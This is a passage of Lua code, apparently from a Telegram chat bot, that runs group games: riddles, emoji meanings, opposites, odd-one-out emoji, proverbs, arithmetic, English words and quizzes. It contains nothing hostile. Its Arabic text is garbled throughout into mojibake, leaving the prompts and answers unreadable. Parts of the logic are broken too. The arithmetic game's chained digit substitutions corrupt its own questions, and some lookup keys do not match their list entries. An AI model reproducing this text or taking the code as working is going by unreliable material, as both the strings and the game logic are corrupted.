Devmfm:setex(mustafa.."SET:GAME"..msg.chat_id_, 100, true)  
return false  
end end
if text == 'ุญุฒูุฑู' and ChCheck(msg) or text == 'ุงูุญุฒูุฑู' and ChCheck(msg) then
if not Devmfm:get(mustafa..'mfm:Lock:Games'..msg.chat_id_) then
Devmfm2 = {'ุงูุฌุฑุณ','ุนูุฑุจ ุงูุณุงุนู','ุงูุณูู','ุงููุทุฑ','5','ุงููุชุงุจ','ุงูุจุณูุงุฑ','7','ุงููุนุจู','ุจูุช ุงูุดุนุฑ','ููุงูู','ุงูุง','ุงูู','ุงูุงุจุฑู','ุงูุณุงุนู','22','ุบูุท','ูู ุงูุณุงุนู','ุงูุจูุชูุฌุงู','ุงูุจูุถ','ุงููุฑุงูู','ุงูุถูุก','ุงูููุงุก','ุงูุถู','ุงูุนูุฑ','ุงูููู','ุงููุดุท','ุงูุญูุฑู','ุงูุจุญุฑ','ุงูุซูุฌ','ุงูุงุณููุฌ','ุงูุตูุช','ุจูู'};
name = Devmfm2[math.random(#Devmfm2)]
Devmfm:set(mustafa..'mfm:GameNum'..msg.chat_id_,name)
Devmfm:del(mustafa..'mfm:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'ุงูุฌุฑุณ','ุดูุฆ ุงุฐุง ููุณุชู ุตุฑุฎ ูุง ููู ุ')
name = string.gsub(name,'ุนูุฑุจ ุงูุณุงุนู','ุงุฎูุงู ูุง ูุณุชุทูุนุงู ุชูุถูู ุงูุซุฑ ูู ุฏูููู ูุนุง ููุง ููุง ุ')
name = string.gsub(name,'ุงูุณูู','ูุง ูู ุงูุญููุงู ุงูุฐู ูู ูุตุนุฏ ุงูู ุณูููุฉ ููุญ ุนููู ุงูุณูุงู ุ')
name = string.gsub(name,'ุงููุทุฑ','ุดูุฆ ูุณูุท ุนูู ุฑุฃุณู ูู ุงูุงุนูู ููุง ูุฌุฑุญู ููุง ูู ุ')
name = string.gsub(name,'5','ูุง ุงูุนุฏุฏ ุงูุฐู ุงุฐุง ุถุฑุจุชู ุจููุณู ูุงุถูุช ุนููู 5 ูุตุจุญ ุซูุงุซูู ')
name = string.gsub(name,'ุงููุชุงุจ','ูุง ุงูุดูุฆ ุงูุฐู ูู ุงูุฑุงู ูููุณ ูู ุฌุฐูุฑ ุ')
name = string.gsub(name,'ุงูุจุณูุงุฑ','ูุง ูู ุงูุดูุฆ ุงูุฐู ูุง ููุดู ุงูุง ุจุงูุถุฑุจ ุ')
name = string.gsub(name,'7','ุนุงุฆูู ูุคููู ูู 6 ุจูุงุช ูุงุฎ ููู ูููู .ููู ุนุฏุฏ ุงูุฑุงุฏ ุงูุนุงุฆูู ')
name = string.gsub(name,'ุงููุนุจู','ูุง ูู ุงูุดูุฆ ุงูููุฌูุฏ ูุณุท ููุฉ ุ')
name = string.gsub(name,'ุจูุช ุงูุดุนุฑ','ูุง ูู ุงูุจูุช ุงูุฐู ููุณ ููู ุงุจูุงุจ ููุง ููุงูุฐ ุ ')
name = string.gsub(name,'ููุงูู','ูุญุฏู ุญููู ููุบุฑูุฑู ุชูุจุณ ููุฉ ุชููุฑู .ูู ููู ุ ')
name = string.gsub(name,'ุงูุง','ุงุจู ุงูู ูุงุจู ุงุจูู ูููุณ ุจุงุฎุชู ููุง ุจุงุฎูู ููู ูููู ุ')
name = string.gsub(name,'ุงูู','ุงุฎุช ุฎุงูู ูููุณุช ุฎุงูุชู ูู ุชููู ุ ')
name = string.gsub(name,'ุงูุงุจุฑู','ูุง ูู ุงูุดูุฆ ุงูุฐู ูููุง ุฎุทุง ุฎุทูู ููุฏ ุดูุฆุง ูู ุฐููู ุ ')
name = string.gsub(name,'ุงูุณุงุนู','ูุง ูู ุงูุดูุฆ ุงูุฐู ูููู ุงูุตุฏู ููููู ุงุฐุง ุฌุงุน ูุฐุจ ุ')
name = string.gsub(name,'22','ูู ูุฑู ููุทุจู ุนูุฑุจุง ุงูุณุงุนู ุนูู ุจุนุถููุง ูู ุงูููู ุงููุงุญุฏ ')
name = string.gsub(name,'ุบูุท','ูุง ูู ุงููููู ุงููุญูุฏู ุงูุชู ุชููุถ ุบูุท ุฏุงุฆูุง ุ ')
name = string.gsub(name,'ูู ุงูุณุงุนู','ูุง ูู ุงูุณุคุงู ุงูุฐู ุชุฎุชูู ุงุฌุงุจุชู ุฏุงุฆูุง ุ')
name = string.gsub(name,'ุงูุจูุชูุฌุงู','ุฌุณู ุงุณูุฏ ูููุจ ุงุจูุถ ูุฑุงุณ ุงุฎุธุฑ ููุง ูู ุ')
name = string.gsub(name,'ุงูุจูุถ','ูุงูู ุงูุดูุฆ ุงูุฐู ุงุณูู ุนูู ูููู ุ')
name = string.gsub(name,'ุงููุฑุงูู','ุงุฑู ูู ุดูุฆ ูู ุฏูู ุนููู ูู ุงููู ุ ')
name = string.gsub(name,'ุงูุถูุก','ูุง ูู ุงูุดูุฆ ุงูุฐู ูุฎุชุฑู ุงูุฒุฌุงุฌ ููุง ููุณุฑู ุ')
name = string.gsub(name,'ุงูููุงุก','ูุง ูู ุงูุดูุฆ ุงูุฐู ูุณูุฑ ุงูุงูู ููุง ุชุฑุงู ุ')
name = string.gsub(name,'ุงูุถู','ูุง ูู ุงูุดูุฆ ุงูุฐู ููุงุญูู ุงูููุง ุชุฐูุจ ุ ')
name = string.gsub(name,'ุงูุนูุฑ','ูุง ูู ุงูุดูุก ุงูุฐู ูููุง ุทุงู ูุตุฑ ุ ')
name = string.gsub(name,'ุงูููู','ูุง ูู ุงูุดูุฆ ุงูุฐู ููุชุจ ููุง ููุฑุฃ ุ')
name = string.gsub(name,'ุงููุดุท','ูู ุฃุณูุงู ููุง ูุนุถ ูุง ูู ุ ')
name = string.gsub(name,'ุงูุญูุฑู','ูุง ูู ุงูุดูุฆ ุงุฐุง ุฃุฎุฐูุง ููู ุงุฒุฏุงุฏ ููุจุฑ ุ')
name = string.gsub(name,'ุงูุจุญุฑ','ูุง ูู ุงูุดูุฆ ุงูุฐู ูุฑูุน ุงุซูุงู ููุง ููุฏุฑ ูุฑูุน ูุณูุงุฑ ุ')
name = string.gsub(name,'ุงูุซูุฌ','ุงูุง ุงุจู ุงููุงุก ูุงู ุชุฑูููู ูู ุงููุงุก ูุช ููู ุงูุง ุ')
name = string.gsub(name,'ุงูุงุณููุฌ','ููู ุซููุจ ููุน ุฐุงูู ุงุญูุถ ุงููุงุก ููู ุงููู ุ')
name = string.gsub(name,'ุงูุตูุช','ุงุณูุฑ ุจูุง ุฑุฌููู ููุง ุงุฏุฎู ุงูุง ุจุงูุงุฐููู ููู ุงูุง ุ')
name = string.gsub(name,'ุจูู','ุญุงูู ููุญููู ูุตู ูุงุดู ููุตู ูุจููู ููู ุงููู ุ ')
mustafaTEAM = 'โ๏ธุงูู ูุงุญุฏ ูุญููุง ูุฑุจุญ โซ '..name
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md')
return false
end end
if text == Devmfm:get(mustafa..'mfm:GameNum'..msg.chat_id_) and not Devmfm:get(mustafa..'mfm:Games:Ids'..msg.chat_id_) then
if not Devmfm:get(mustafa..'mfm:Games:Ids'..msg.chat_id_) then 
mustafaTEAM = 'โ๏ธูุจุฑูู ููุฏ ุฑุจุญุช ูู ุงููุนุจู \nโ๏ธุงุฑุณู โซ ุญุฒูุฑู ููุนุจ ูุฑู ุงุฎุฑู'
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md')
Devmfm:incrby(mustafa..'mfm:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
Devmfm:set(mustafa..'mfm:Games:Ids'..msg.chat_id_,true)
end 
if text == 'ุงููุนุงูู' and ChCheck(msg) or text == 'ูุนุงูู' and ChCheck(msg) then
if not Devmfm:get(mustafa..'mfm:Lock:Games'..msg.chat_id_) then
Devmfm2 = {'ูุฑุฏ','ุฏุฌุงุฌู','ุจุทุฑูู','ุถูุฏุน','ุจููู','ูุญูู','ุฏูู','ุฌูู','ุจูุฑู','ุฏููููู','ุชูุณุงุญ','ูุฑุด','ููุฑ','ุงุฎุทุจูุท','ุณููู','ุฎูุงุด','ุงุณุฏ','ูุฃุฑ','ุฐุฆุจ','ูุฑุงุดู','ุนูุฑุจ','ุฒุฑุงูู','ูููุฐ','ุชูุงุญู','ุจุงุฐูุฌุงู'}
name = Devmfm2[math.random(#Devmfm2)]
Devmfm:set(mustafa..'mfm:GameNum2'..msg.chat_id_,name)
Devmfm:del(mustafa..'mfm:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'ูุฑุฏ','๐')
name = string.gsub(name,'ุฏุฌุงุฌู','๐')
name = string.gsub(name,'ุจุทุฑูู','๐ง')
name = string.gsub(name,'ุถูุฏุน','๐ธ')
name = string.gsub(name,'ุจููู','๐ฆ')
name = string.gsub(name,'ูุญูู','๐')
name = string.gsub(name,'ุฏูู','๐')
name = string.gsub(name,'ุฌูู','๐ซ')
name = string.gsub(name,'ุจูุฑู','๐')
name = string.gsub(name,'ุฏููููู','๐ฌ')
name = string.gsub(name,'ุชูุณุงุญ','๐')
name = string.gsub(name,'ูุฑุด','๐ฆ')
name = string.gsub(name,'ููุฑ','๐')
name = string.gsub(name,'ุงุฎุทุจูุท','๐')
name = string.gsub(name,'ุณููู','๐')
name = string.gsub(name,'ุฎูุงุด','๐ฆ')
name = string.gsub(name,'ุงุณุฏ','๐ฆ')
name = string.gsub(name,'ูุฃุฑ','๐ญ')
name = string.gsub(name,'ุฐุฆุจ','๐บ')
name = string.gsub(name,'ูุฑุงุดู','๐ฆ')
name = string.gsub(name,'ุนูุฑุจ','๐ฆ')
name = string.gsub(name,'ุฒุฑุงูู','๐ฆ')
name = string.gsub(name,'ูููุฐ','๐ฆ')
name = string.gsub(name,'ุชูุงุญู','๐')
name = string.gsub(name,'ุจุงุฐูุฌุงู','๐')
mustafaTEAM = 'โ๏ธูุง ูุนูู ูุฐุง ุงูุณูุงูู :ุ โซ '..name
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md')
return false
end end
if text == Devmfm:get(mustafa..'mfm:GameNum2'..msg.chat_id_) and not Devmfm:get(mustafa..'mfm:Games:Ids'..msg.chat_id_) then
if not Devmfm:get(mustafa..'mfm:Games:Ids'..msg.chat_id_) then 
mustafaTEAM = 'โ๏ธูุจุฑูู ููุฏ ุฑุจุญุช ูู ุงููุนุจู \nโ๏ธุงุฑุณู โซ ุงููุนุงูู ููุนุจ ูุฑู ุงุฎุฑู'
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md')
Devmfm:incrby(mustafa..'mfm:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
Devmfm:set(mustafa..'mfm:Games:Ids'..msg.chat_id_,true)
end 
if text == 'ุงูุนูุณ' and ChCheck(msg) or text == 'ุนูุณ' and ChCheck(msg) then
if not Devmfm:get(mustafa..'mfm:Lock:Games'..msg.chat_id_) then
Devmfm2 = {'ุจุงู','ูููุช','ููุฒูู','ุงุณูุนู','ุงุญุจู','ููุญูู','ูุถูู','ุญุงุฑู','ูุงุตู','ุฌูู','ุณุฑูุน','ููุณู','ุทููู','ุณููู','ุถุนูู','ุดุฑูู','ุดุฌุงุน','ุฑุญุช','ุนุฏู','ูุดูุท','ุดุจุนุงู','ููุนุทุดุงู','ุฎูุด ููุฏ','ุงูู','ูุงุฏุฆ'}
name = Devmfm2[math.random(#Devmfm2)]
Devmfm:set(mustafa..'mfm:GameNum3'..msg.chat_id_,name)
Devmfm:del(mustafa..'mfm:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'ุจุงู','ููู')
name = string.gsub(name,'ูููุช','ูุงูููุช')
name = string.gsub(name,'ููุฒูู','ุฒูู')
name = string.gsub(name,'ุงุณูุนู','ูุงุณูุนู')
name = string.gsub(name,'ุงุญุจู','ูุงุญุจู')
name = string.gsub(name,'ูุญูู','ุญูู')
name = string.gsub(name,'ูุถูู','ูุตุฎ')
name = string.gsub(name,'ุญุงุฑู','ุจุงุฑุฏู')
name = string.gsub(name,'ูุงุตู','ุนุงูู')
name = string.gsub(name,'ุฌูู','ููู')
name = string.gsub(name,'ุณุฑูุน','ุจุทูุก')
name = string.gsub(name,'ููุณู','ุถูุฌู')
name = string.gsub(name,'ุทููู','ูุฒู')
name = string.gsub(name,'ุณููู','ุถุนูู')
name = string.gsub(name,'ุถุนูู','ููู')
name = string.gsub(name,'ุดุฑูู','ููุงุฏ')
name = string.gsub(name,'ุดุฌุงุน','ุฌุจุงู')
name = string.gsub(name,'ุฑุญุช','ุงุฌูุช')
name = string.gsub(name,'ุญู','ููุช')
name = string.gsub(name,'ูุดูุท','ูุณูู')
name = string.gsub(name,'ุดุจุนุงู','ุฌูุนุงู')
name = string.gsub(name,'ููุนุทุดุงู','ุนุทุดุงู')
name = string.gsub(name,'ุฎูุด ููุฏ','ููุฎูุด ููุฏ')
name = string.gsub(name,'ุงูู','ูุทู')
name = string.gsub(name,'ูุงุฏุฆ','ุนุตุจู')
mustafaTEAM = 'โ๏ธูุง ูู ุนูุณ ูููุฉ โซ '..name
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md')
return false
end end
if text == Devmfm:get(mustafa..'mfm:GameNum3'..msg.chat_id_) and not Devmfm:get(mustafa..'mfm:Games:Ids'..msg.chat_id_) then
if not Devmfm:get(mustafa..'mfm:Games:Ids'..msg.chat_id_) then 
mustafaTEAM = 'โ๏ธูุจุฑูู ููุฏ ุฑุจุญุช ูู ุงููุนุจู \nโ๏ธุงุฑุณู โซ ุงูุนูุณ ููุนุจ ูุฑู ุงุฎุฑู'
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md')
Devmfm:incrby(mustafa..'mfm:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
Devmfm:set(mustafa..'mfm:Games:Ids'..msg.chat_id_,true)
end 
if text == 'ุงููุฎุชูู' and ChCheck(msg) or text == 'ูุฎุชูู' and ChCheck(msg) then
if not Devmfm:get(mustafa..'mfm:Lock:Games'..msg.chat_id_) then
Devmfm2 = {'๐ธ','โ?','๐ผ','๐','๐','๐','โญ๏ธ','๐ฅ','โ','๐ฅ','โ๏ธ','๐จโ๐ฌ','๐จโ๐ป','๐จโ๐ง','๐ฉโ๐ณ','๐งโโ','๐งโโ๏ธ','๐งโโ','๐โโ','๐งโโ','๐ฌ','๐จโ๐จโ๐ง','๐','๐ค','โ๏ธ','๐','๐ฉโโ๏ธ','๐จโ๐จ'};
name = Devmfm2[math.random(#Devmfm2)]
Devmfm:set(mustafa..'mfm:GameNum4'..msg.chat_id_,name)
Devmfm:del(mustafa..'mfm:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'๐ธ','๐น๐น๐น๐ธ๐น๐น๐น๐น')
name = string.gsub(name,'โ?๏ธ','๐๐๐โ?๏ธ๐๐๐๐')
name = string.gsub(name,'๐ผ','๐ป๐ป๐ป๐ป๐ป๐ป๐ป๐ผ')
name = string.gsub(name,'๐','๐๐๐๐๐๐๐๐')
name = string.gsub(name,'๐','๐๐๐๐๐๐๐๐')
name = string.gsub(name,'๐','๐๐๐๐๐๐๐๐')
name = string.gsub(name,'โญ๏ธ','๐๐๐๐๐๐โญ๏ธ๐')
name = string.gsub(name,'๐ฅ','๐ซ๐ซ๐ซ๐ฅ๐ซ๐ซ๐ซ๐ซ')
name = string.gsub(name,'โ','๐จ๐จ๐จโ๐จ๐จ๐จ๐จ')
name = string.gsub(name,'๐ฅ','โ๏ธโ๏ธโ๏ธ๐ฅโ๏ธโ๏ธโ๏ธโ๏ธ')
name = string.gsub(name,'โ๏ธ','โ๏ธโ๏ธโ๏ธโ๏ธโ๏ธโ๏ธโ๏ธโ๏ธโ๏ธ')
name = string.gsub(name,'๐จโ๐ฌ','๐ฉโ๐ฌ๐ฉโ๐ฌ๐ฉโ๐ฌ๐ฉโ๐ฌ๐ฉโ๐ฌ๐จโ๐ฌ๐ฉโ๐ฌ๐ฉโ๐ฌ')
name = string.gsub(name,'๐จโ๐ป','๐ฉโ๐ป๐ฉโ๐ป๐จโ๐ป๐ฉโ๐ป๐ฉโ๐ป๐ฉโ๐ป๐ฉโ๐ป๐ฉโ๐ป')
name = string.gsub(name,'๐จโ๐ง','๐ฉโ๐ง๐ฉโ๐ง๐ฉโ๐ง๐ฉโ๐ง๐ฉโ๐ง๐ฉโ๐ง๐จโ๐ง๐ฉโ๐ง')
name = string.gsub(name,'๐ฉโ๐ณ','๐จโ๐ณ๐จโ๐ณ๐ฉโ๐ณ๐จโ๐ณ๐จโ๐ณ๐จโ๐ณ๐จโ๐ณ๐จโ๐ณ')
name = string.gsub(name,'๐งโโ๏ธ','๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ')
name = string.gsub(name,'๐งโโ๏ธ','๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ')
name = string.gsub(name,'๐งโโ๏ธ','๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ')
name = string.gsub(name,'๐โโ๏ธ','๐โโ๏ธ๐โโ๏ธ๐โโ๏ธ๐โโ๏ธ๐โโ๏ธ๐โโ๏ธ๐โโ๏ธ๐โโ๏ธ')
name = string.gsub(name,'๐งโโ๏ธ','๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ๐งโโ๏ธ')
name = string.gsub(name,'๐ฌ','๐ญ๐ญ๐ญ๐ญ๐ฌ๐ญ๐ญ๐ญ')
name = string.gsub(name,'๐จโ๐จโ๐ง','๐จโ๐จโ๐ฆ๐จโ๐จโ๐ฆ๐จโ๐จโ๐ฆ๐จโ๐จโ๐ฆ๐จโ๐จโ๐ฆ๐จโ๐จโ๐ง๐จโ๐จโ๐ฆ๐จโ๐จโ๐ฆ')
name = string.gsub(name,'๐','๐๐๐๐๐๐๐๐')
name = string.gsub(name,'๐ค','๐ฅ๐ฅ๐ฅ๐ฅ๐ฅ๐ค๐ฅ๐ฅ')
name = string.gsub(name,'โ๏ธ','โณโณโณโณโณโ๏ธโณโณ')
name = string.gsub(name,'๐','๐๐๐๐๐๐๐๐')
name = string.gsub(name,'๐ฉโโ๏ธ','๐จโโ๏ธ๐จโโ๏ธ๐จโโ๏ธ๐จโโ๏ธ๐จโโ๏ธ๐ฉโโ๏ธ๐จโโ๏ธ๐จโโ๏ธ')
name = string.gsub(name,'๐จโ๐จ','๐ฉโ๐จ๐ฉโ๐จ๐จโ๐จ๐ฉโ๐จ๐ฉโ๐จ๐ฉโ๐จ๐ฉโ๐จ๐ฉโ๐จ')
mustafaTEAM = 'โ๏ธุงูู ูุงุญุฏ ูุทูุน ุงููุฎุชูู ูุฑุจุญ\n{'..name..'} '
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md')
return false
end end
if text == Devmfm:get(mustafa..'mfm:GameNum4'..msg.chat_id_) and not Devmfm:get(mustafa..'mfm:Games:Ids'..msg.chat_id_) then
if not Devmfm:get(mustafa..'mfm:Games:Ids'..msg.chat_id_) then 
mustafaTEAM = 'โ๏ธูุจุฑูู ููุฏ ุฑุจุญุช ูู ุงููุนุจู \nโ๏ธุงุฑุณู โซ ุงููุฎุชูู ููุนุจ ูุฑู ุงุฎุฑู'
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md')
Devmfm:incrby(mustafa..'mfm:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
Devmfm:set(mustafa..'mfm:Games:Ids'..msg.chat_id_,true)
end  
if text == 'ุงูุซูู' and ChCheck(msg) or text == 'ุงูุงูุซูู' and ChCheck(msg) then
if not Devmfm:get(mustafa..'mfm:Lock:Games'..msg.chat_id_) then
Devmfm2 = {
'ุฌูุฒ','ุถุฑุงุทู','ุงูุญุจู','ุงูุญุงูู','ุดูุฑู','ุจูุฏู','ุณูุงูู','ุงููุฎูู','ุงูุฎูู','ุญุฏุงุฏ','ุงููุจูู','ูุฑูุต','ูุฑุฏ','ุงูุนูุจ','ุงูุนูู','ุงูุฎุจุฒ','ุจุงูุญุตุงุฏ','ุดูุฑ','ุดูู','ููุญูู',
};
name = Devmfm2[math.random(#Devmfm2)]
Devmfm:set(mustafa..'mfm:GameNum5'..msg.chat_id_,name)
Devmfm:del(mustafa..'mfm:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'ุฌูุฒ','ููุทู ___ ูููุงุนูุฏู ุณููู')
name = string.gsub(name,'ุถุฑุงุทู','ุงูู ูุณูู ุงููุทู ูุชุญูู ___ ')
name = string.gsub(name,'ุจูุฏู','ุงูู ___ ูุญุฏ ูููุฏู')
name = string.gsub(name,'ุงูุญุงูู','ุชุฌุฏู ูู ___ ูุนุงู')
name = string.gsub(name,'ุดูุฑู','ูุน ุงูุฎูู ูุง ___ ')
name = string.gsub(name,'ุงููุฎูู','ุงูุทูู ุทูู ___ ูุงูุนูู ุนูู ุงูุตุฎูุฉ')
name = string.gsub(name,'ุณูุงูู','ุจุงููุฌู ุงูุฑุงูุฉ ูุจุงูุธูุฑ ___ ')
name = string.gsub(name,'ุงูุฎูู','ูู ููุฉ ___ ุดุฏู ุนูู ุงูฺูุงุจ ุณุฑูุฌ')
name = string.gsub(name,'ุญุฏุงุฏ','ูููู ูู ุตุฎู ูุฌูู ูุงู ุขูู ___ ')
name = string.gsub(name,'ุงููุจูู',' ___ ูุง ูุฎุงู ูู ุงููุทุฑ')
name = string.gsub(name,'ุงูุญุจู','ุงููู ุชูุฏุบุฉ ุงูุญูุฉ ูุฎุงู ูู ุฌุฑุฉ ___ ')
name = string.gsub(name,'ูุฑูุต','ุงููุงูุนุฑู ___ ูููู ุงููุงุน ุนูุฌู')
name = string.gsub(name,'ุงูุนูุจ','ุงููุงูููุญ ___ ูููู ุญุงูุถ')
name = string.gsub(name,'ุงูุนูู','___ ุฅุฐุง ุญุจุช ุงูฺูุฉ ุงุจููุณ ูุฏุฎู ุงูุฌูุฉ')
name = string.gsub(name,'ุงูุฎุจุฒ','ุงูุทู ___ ููุฎุจุงุฒ ุญุชู ูู ูุงูู ูุตู')
name = string.gsub(name,'ุจุงูุญุตุงุฏ','ุงุณูุฉ ___ ูููุฌูู ููุณูุฑ')
name = string.gsub(name,'ุดูุฑ','ุงูุดู ___ ููุง ุชุนุจุฑ ููุฑ')
name = string.gsub(name,'ุดูู','ูุงูู ุชุนุจ ูุงูู ___ ูุง ูู ุนูู ุงูุญุงุถุฑ ููุฉ')
name = string.gsub(name,'ุงููุฑุฏ',' ___ ุจุนูู ุงูู ุบุฒุงู')
name = string.gsub(name,'ููุญูู','ุงุฌู ___ ุนูุงูุง')
mustafaTEAM = 'โ๏ธุงููู ุงููุซุงู ุงูุชุงูู โซ ['..name..']'
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md')
return false
end end
if text == Devmfm:get(mustafa..'mfm:GameNum5'..msg.chat_id_) then
if not Devmfm:get(mustafa..'mfm:Games:Ids'..msg.chat_id_) then 
Devmfm:incrby(mustafa..'mfm:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
Devmfm:del(mustafa..'mfm:GameNum5'..msg.chat_id_)
mustafaTEAM = 'โ๏ธูุจุฑูู ููุฏ ุฑุจุญุช ูู ุงููุนุจู \nโ๏ธุงุฑุณู โซ ุงูุซูู ููุนุจ ูุฑู ุงุฎุฑู'
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md')
end
Devmfm:set(mustafa..'mfm:Games:Ids'..msg.chat_id_,true)
end  
if text == 'ุฑูุงุถูุงุช' and ChCheck(msg) or text == 'ุงูุฑูุงุถูุงุช' and ChCheck(msg) then
if not Devmfm:get(mustafa..'mfm:Lock:Games'..msg.chat_id_) then
Devmfm2 = {'9','46','2','9','5','4','25','10','17','15','39','5','16',};
name = Devmfm2[math.random(#Devmfm2)]
Devmfm:set(mustafa..'mfm:GameNum6'..msg.chat_id_,name)
Devmfm:del(mustafa..'mfm:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'9','7 + 2 = ?')
name = string.gsub(name,'46','41 + 5 = ?')
name = string.gsub(name,'2','5 - 3 = ?')
name = string.gsub(name,'9','5 + 2 + 2 = ?')
name = string.gsub(name,'5','8 - 3 = ?')
name = string.gsub(name,'4','40 รท 10 = ?')
name = string.gsub(name,'25','30 - 5 = ?')
name = string.gsub(name,'10','100 รท 10 = ?')
name = string.gsub(name,'17','10 + 5 + 2 = ?')
name = string.gsub(name,'15','25 - 10 = ?')
name = string.gsub(name,'39','44 - 5 = ?')
name = string.gsub(name,'5','12 + 1 - 8 = ?')
name = string.gsub(name,'16','16 + 16 - 16 = ?')
mustafaTEAM = 'โ๏ธุงููู ุงููุนุงุฏูู ุงูุชุงููู โซ โค\n{'..name..'} '
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md')
return false
end end
if text == Devmfm:get(mustafa..'mfm:GameNum6'..msg.chat_id_) then
if not Devmfm:get(mustafa..'mfm:Games:Ids'..msg.chat_id_) then 
Devmfm:incrby(mustafa..'mfm:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
Devmfm:del(mustafa..'mfm:GameNum6'..msg.chat_id_)
mustafaTEAM = 'โ๏ธูุจุฑูู ููุฏ ุฑุจุญุช ูู ุงููุนุจู \nโ๏ธุงุฑุณู โซ ุฑูุงุถูุงุช ููุนุจ ูุฑู ุงุฎุฑู'
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md')
end
Devmfm:set(mustafa..'mfm:Games:Ids'..msg.chat_id_,true)
end  
if text == 'ุงูุงููููุฒู' and ChCheck(msg) or text == 'ุงูุงูุฌููุฒูู' and ChCheck(msg) or text == 'ุงููููุฒูู' and ChCheck(msg) then
if not Devmfm:get(mustafa..'mfm:Lock:Games'..msg.chat_id_) then
Devmfm2 = {'ูุนูููุงุช','ูููุงุช','ูุฌููุนุงุช','ูุชุงุจ','ุชูุงุญู','ุณุฏูู','ูููุฏ','ุงุนูู','ุฐุฆุจ','ุชูุณุงุญ','ุฐูู','ุดุงุทุฆ','ุบุจู',};
name = Devmfm2[math.random(#Devmfm2)]
Devmfm:set(mustafa..'mfm:GameNum7'..msg.chat_id_,name)
Devmfm:del(mustafa..'mfm:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'ุฐุฆุจ','Wolf')
name = string.gsub(name,'ูุนูููุงุช','Information')
name = string.gsub(name,'ูููุงุช','Channels')
name = string.gsub(name,'ูุฌููุนุงุช','Groups')
name = string.gsub(name,'ูุชุงุจ','Book')
name = string.gsub(name,'ุชูุงุญู','Apple')
name = string.gsub(name,'ูููุฏ','money')
name = string.gsub(name,'ุงุนูู','I know')
name = string.gsub(name,'ุชูุณุงุญ','crocodile')
name = string.gsub(name,'ุดุงุทุฆ','Beach')
name = string.gsub(name,'ุบุจู','Stupid')
name = string.gsub(name,'ุตุฏุงูู','Friendchip')
mustafaTEAM = 'โ๏ธูุง ูุนูู ูููุฉ โซ '..name
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md')
return false
end end
if text == Devmfm:get(mustafa..'mfm:GameNum7'..msg.chat_id_) then
if not Devmfm:get(mustafa..'mfm:Games:Ids'..msg.chat_id_) then 
Devmfm:incrby(mustafa..'mfm:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
Devmfm:del(mustafa..'mfm:GameNum7'..msg.chat_id_)
mustafaTEAM = 'โ๏ธูุจุฑูู ููุฏ ุฑุจุญุช ูู ุงููุนุจู \nโ๏ธุงุฑุณู โซ ุงููููุฒูู ููุนุจ ูุฑู ุงุฎุฑู'
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md')
end
Devmfm:set(mustafa..'mfm:Games:Ids'..msg.chat_id_,true)
end  
if text == 'ุงุณุฆูู' and ChCheck(msg) or text == 'ุงุฎุชูุงุฑุงุช' and ChCheck(msg) or text == 'ุงูุงุณุฆูู' and ChCheck(msg) or text == 'ุงุณุงูู' and ChCheck(msg) then
if not Devmfm:get(mustafa..'mfm:Lock:Games'..msg.chat_id_) then
Devmfm2 = {'ุงูููู','14','ุงููู','11','30','ุจูุชูู','ุณุชูู ุฌูุจุฑ','ุจุงุฑูุณ','10','ุงูููู','ุญุฑู ุงููุงู','ุงูุดุนุฑ','ุณุญุงุจ','ุงูุงุณู','ุฐูุจ','ุญุฑู ุงูุงู','ุงูุนุฒุงุฆู','ุงูุณุงุช','ุงูููุฌููู','ุงุณูุง','6','ุงูุงุณุฏ','ููุฑ','ุงูุฏููููู','ุงูุฑูุจุง','ุงูุฒุฆุจู','ููุฏู','ุงูุงูุณุงู','ุงูุดูุทุงู','ุฎุฏูุฌู',}
name = Devmfm2[math.random(#Devmfm2)]
Devmfm:set(mustafa..'mfm:GameNum8'..msg.chat_id_,name)
Devmfm:del(mustafa..'mfm:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'ุงูููู','โ๏ธูุงูู ุงุทูู ููุฑ ูู ุงูุนุงูู ุ\n1- ุงูููู\n2- ุงููุฑุงุช\n3- ููุฑ ุงููููุบู')
name = string.gsub(name,'14','โ๏ธูุงุนุฏุฏ ุนุธุงู ุงููุฌู ุ\n1- 15\n2- 13\n3- 14')
